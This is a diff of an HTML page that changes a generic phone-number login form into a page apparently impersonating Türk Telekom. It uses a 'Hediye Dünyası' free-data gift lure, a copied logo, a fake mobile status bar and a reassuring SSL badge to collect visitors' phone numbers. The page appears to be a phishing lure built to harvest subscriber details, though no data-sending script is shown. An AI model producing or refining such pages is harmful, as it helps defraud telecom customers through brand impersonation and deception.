@@ -4,53 +4,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kolay Giriş</title>
+    <title>Türk Telekom - Hediye Dünyası</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 
 <body>
     <div class="page-wrapper">
-        <!-- Top blue gradient area -->
-        <div class="top-section"></div>
-
-        <!-- Login card -->
-        <div class="login-card">
-            <div class="card-header">
-                <h1 class="title">
-                    <span class="arrow">»</span>Kolay Giriş
-                </h1>
-                <div class="divider"></div>
+        <!-- Status bar -->
+        <div class="status-bar">
+            <div class="status-badge">
+                <span class="status-dot"></span>
+                4.5G
             </div>
-
-            <div class="card-body">
-                <div class="input-group">
-                    <label for="phone" class="input-label">Cep Telefonu Numarası</label>
-                    <div class="phone-input-wrapper">
-                        <span class="country-code">+90</span>
-                        <input type="tel" id="phone" class="phone-input" maxlength="10" placeholder=""
-                            autocomplete="tel">
-                    </div>
-                </div>
-
-                <div class="checkbox-group">
-                    <label class="checkbox-label">
-                        <input type="checkbox" id="rememberMe">
-                        <span class="custom-checkbox"></span>
-                        <span class="checkbox-text">Oturumu Açık Tut</span>
-                    </label>
-                </div>
-
-                <button type="button" class="login-btn" id="loginBtn">
-                    Giriş Yap
-                </button>
+            <div class="status-icons">
+                <span>📶</span>
+                <span>🔋</span>
             </div>
         </div>
 
-        <!-- Footer links -->
-        <div class="footer-links">
-            <a href="#" class="footer-link">Aydınlatma Metni</a>
-            <a href="#" class="footer-link">Çerez Politikası</a>
+        <!-- Logo -->
+        <div class="logo-area">
+            <div class="tt-logo">
+                <svg viewBox="0 0 70 60" fill="none">
+                    <polygon points="10,30 30,10 30,50" fill="#0066ff" />
+                    <polygon points="25,30 45,10 45,50" fill="#00c8ff" />
+                    <polygon points="40,30 60,10 60,50" fill="#00e6a0" />
+                    <polygon points="30,22 38,30 30,38" fill="#ff4466" />
+                </svg>
+            </div>
+            <div class="logo-text">TÜRK TELEKOM</div>
+        </div>
+
+        <!-- Campaign banner -->
+        <div class="campaign-banner">
+            <div class="campaign-icon">🎁</div>
+            <div>
+                <div class="campaign-title">Hediye Dünyası Kampanyası</div>
+                <div class="campaign-subtitle">50 GB + Sosyal Medya Paketi kazan</div>
+            </div>
+        </div>
+
+        <!-- Phone form -->
+        <div class="form-section">
+            <div class="form-label">TELEFON NUMARANIZ</div>
+            <div class="phone-input-container">
+                <div class="phone-display">
+                    <input type="tel" id="phone" class="phone-input-dark" placeholder="0 (5__) ___ __ __"
+                        maxlength="11">
+                </div>
+            </div>
+            <div class="form-hint">
+                <span class="hint-icon">i</span>
+                Abonelik numaranızı giriniz
+            </div>
+        </div>
+
+        <!-- Action button -->
+        <button type="button" class="action-btn" id="loginBtn">
+            <span class="btn-icon">🎁</span>
+            Hediyemi Sorgula
+        </button>
+
+        <!-- SSL info -->
+        <div class="ssl-info">
+            <span class="ssl-icon">🛡️</span>
+            Bilgileriniz 256-bit SSL şifrelemesiyle korunmaktadır
+        </div>
+
+        <!-- Footer -->
+        <div class="dark-footer">
+            © 2026 Türk Telekom A.Ş. Tüm hakları saklıdır.
         </div>
     </div>
 
